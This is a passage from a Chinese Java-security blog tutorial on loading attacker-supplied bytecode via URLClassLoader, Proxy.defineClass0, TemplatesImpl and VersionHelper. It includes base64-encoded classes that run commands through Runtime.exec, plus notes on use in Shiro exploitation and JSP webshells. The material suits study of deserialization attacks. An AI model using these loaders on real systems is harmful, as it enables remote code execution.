<span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">:</span> <span class="string">&quot;bbb&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x03-URLClassLoader"><a href="#0x03-URLClassLoader" class="headerlink" title="0x03 URLClassLoader"></a>0x03 URLClassLoader</h2><p>URLClassLoader可以加载任意路径下的类</p><p>有点类似于<code>RMI</code>和<code>LDAP</code>下的远程加载恶意类的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;ByteCodeEvil&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        constructor.newInstance(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将0x01中的恶意类的<code>java</code>文件，放置在文件夹中，(将包名除去)，重新编译为<code>class</code>文件，然后使用python开一个<code>HTTP</code>服务</p><p>同理，使用内置对象替换，也可以作为<code>jsp</code>马 (这里4ra1n师傅将恶意类打包成jar包了)</p><h2 id="0x04-defineClass0"><a href="#0x04-defineClass0" class="headerlink" title="0x04 defineClass0"></a>0x04 defineClass0</h2><p>这里的<code>defineClass0</code>，是基于<code>Proxy</code>的<strong>native</strong>方法，使用到的<code>Proxy</code>类是Java动态代理的底层实现类。也许可以绕过一些防御。</p><p>在<code>java.lang.reflect.Proxy</code>中有这么一个方法，里面没有定义任何方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass0(ClassLoader loader, String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.proxy_define0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Define0_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; defineByProxy(String className, <span class="type">byte</span>[] classBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取系统的类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="comment">// 反射java.lang.reflect.Proxy类获取其中的defineClass0方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Proxy.class.getDeclaredMethod(<span class="string">&quot;defineClass0&quot;</span>,ClassLoader.class, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// 修改方法的访问权限</span></span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 反射调用java.lang.reflect.Proxy.defineClass0()方法</span></span><br><span class="line">        <span class="comment">// 动态向JVM注册对象</span></span><br><span class="line">        <span class="comment">// 返回一个 Class 对象</span></span><br><span class="line">        <span class="keyword">return</span> (Class&lt;?&gt;) method.invoke(<span class="literal">null</span>, classLoader, className, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxjb20vQnl0ZUNvZGVFdmlsOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcALgEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBBDABCAEMMAEQARQcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAEGNvbS9CeXRlQ29kZUV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7ACEAEAARAAAAAQAAABIAEwAAAAIAAQAUABUAAgAWAAAA0gAGAAUAAABHKrcAAbsAAlm3AANNuwAEWbsABVm4AAYrtgAHtgAItwAJtwAKTi22AAtZOgTGABIsGQS2AAwSDbYADFen/+oqLLYADrUAD7EAAAADABcAAAAeAAcAAAAJAAQACwAMAAwAJQAOAC8ADwA+ABEARgASABgAAAA0AAUAAABHABkAGgAAAAAARwAbABMAAQAMADsAHAAdAAIAJQAiAB4AHwADACwAGwAgABMABAAhAAAAGwAC/wAlAAQHACIHACMHACQHACUAAPwAGAcAIwAmAAAABAABACcAAQAoACkAAQAWAAAALwABAAEAAAAFKrQAD7AAAAACABcAAAAGAAEAAAAXABgAAAAMAAEAAAAFABkAGgAAAAEAKgAAAAIAKw==&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; testClass = defineByProxy(<span class="string">&quot;com.ByteCodeEvil&quot;</span>, bytes);</span><br><span class="line">        Constructor&lt;?&gt; constructor = testClass.getConstructor(String.class);</span><br><span class="line">        constructor.newInstance(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-TemplateImpl"><a href="#0x05-TemplateImpl" class="headerlink" title="0x05 TemplateImpl"></a>0x05 TemplateImpl</h2><p>这个类用的比较多一些，例如CC链、Fastjson、7U21</p><p>开发者不会直接使用到 defineClass 方法，但是，Java 底层还是有一些类用到了它，如：<code>TemplatesImpl</code>。</p><p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这个类中定义了一个内部类 <code>TransletClassLoader</code> ，这个类里重写了 <code>defineClass</code> 方法，并且这里没有显式地声明其定义域。Java 中默认情况下，如果一个方法没有显式声明作用域，其作用域为 default。因此，这里被重写的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</p><p>其中<code>TransletClassLoader#defineClass()</code>可以如下追溯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">-&gt; TemplatesImpl#newTransformer()</span><br><span class="line">-&gt; TemplatesImpl#getTransletInstance() </span><br><span class="line">-&gt; TemplatesImpl#defineTransletClasses() </span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>其中，前两个方法<code>TemplatesImpl#getOutputProperties()</code> 、 <code>TemplatesImpl#newTrans</code>，他们的作用域是<code>public</code>，可以尝试呗外部调用。尝试用 <code>newTransformer()</code> 构造一个简单的 POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Template;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tem_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTGNvbS9DYWxjOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHACYBAApTb3VyY2VGaWxlAQAJQ2FsYy5qYXZhDAAZABoHACcMACgAKQEACGNhbGMuZXhlDAAqACsBAAhjb20vQ2FsYwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAADwALAAAAIAADAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABAAEQACABIAAAAEAAEAEwABAAcAFAACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFAALAAAAKgAEAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABUAFgACAAAAAQAXABgAAwASAAAABAABABMAAQAZABoAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAWAAQAFwANABgACwAAAAwAAQAAAA4ADAANAAAAEgAAAAQAAQAbAAEAHAAAAAIAHQ==&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] byteCode = Base64.getDecoder().decode(code);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// _bytecodes 是由字节码组成的数组</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(obj, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// _name 可以是任意字符串，只要不为 null 即可</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(obj, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 固定写法</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(obj, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        </span><br><span class="line">        obj.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>TemplatesImpl</code> 中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类</p><p>于是我们可以编写这样一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="shiro中的利用"><a href="#shiro中的利用" class="headerlink" title="shiro中的利用"></a>shiro中的利用</h3><p>具体可以看p师傅的《Java安全漫谈 - 15.TemplatesImpl在Shiro 中的利用》</p><p>其中<code>TemplatesImpl</code>的初始化可以简化为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;<span class="string">&quot;...bytescode&quot;</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure><h2 id="0x06-VersionHelper"><a href="#0x06-VersionHelper" class="headerlink" title="0x06 VersionHelper"></a>0x06 VersionHelper</h2><p>直接写到临时文件下，然后进行加载</p><p>注：恶意类不要其他的包名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.VersionHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.naming.internal.VersionHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Version_Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarPath</span> <span class="operator">=</span> tmp + File.separator + <span class="string">&quot;ByteCodeEvil.class&quot;</span>;</span><br><span class="line">        Files.write(Paths.get(jarPath), Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQARQoAEQAjBwAkCgACACMHACUHACYKACcAKAoAJwApCgAqACsKAAUALAoABAAtCgAEAC4KAAIALwgAMAoAAgAxCQAQADIHADMHADQBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAMwcANQcAJAcAJQEACkV4Y2VwdGlvbnMHADYBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUADcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwA4DAA5ADoMADsAPAcAPQwAPgA/DAAUAEAMABQAQQwAQgAgDABDAEQBAAEKDAAfACAMABIAEwEADEJ5dGVDb2RlRXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAACYAAYABQAAAEcqtwABuwACWbcAA027AARZuwAFWbgABiu2AAe2AAi3AAm3AApOLbYAC1k6BMYAEiwZBLYADBINtgAMV6f/6iostgAOtQAPsQAAAAIAFwAAAB4ABwAAAAcABAAIAAwACQAlAAsALwAMAD4ADgBGAA8AGAAAABsAAv8AJQAEBwAZBwAaBwAbBwAcAAD8ABgHABoAHQAAAAQAAQAeAAEAHwAgAAEAFgAAAB0AAQABAAAABSq0AA+wAAAAAQAXAAAABgABAAAAEwABACEAAAACACI=&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">VersionHelper</span> <span class="variable">helper</span> <span class="operator">=</span> VersionHelper.getVersionHelper();</span><br><span class="line">        Class&lt;?&gt; clazz = helper.loadClass(<span class="string">&quot;ByteCodeEvil&quot;</span>, <span class="string">&quot;file:&quot;</span> + tmp + File.separator);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">        System.out.println(obj.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x07-ASM加载"><a href="#0x07-ASM加载" class="headerlink" title="0x07 ASM加载"></a>0x07 ASM加载</h2><p>需要手动操纵字节码的需求，可以使用ASM，它可以直接生产 .class字节码文件，也可以在类被加载入JVM之前动态修改类行为）</p><p>相关原理如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220313175434.png"></p><blockquote><p>ASM是Java操纵类字节码的工具，ASM提供两类API，能够分别将类表示为事件和对象。我们先主要了解核心API，即能够将类以事件方式操纵的方式，即用<strong>基于事件的模型</strong>。</p></blockquote><blockquote><p>在采用基于事件的模型时，类是用一系列事件来表示的，每个事件表示类的一个元素，比 如 它的一个标头、一个字段、一个方法声明、一条指令，等等。基于事件的 API 定义了一组 可能 事件，以及这些事件必须遵循的发生顺序，还提供了一个类分析器，为每个被分析元素生 成一个 事件，还提供一个类写入器，由这些事件的序列生成经过编译的类。</p></blockquote><p>下面介绍一下常用API的使用</p><h3 id="ClassVistor"><a 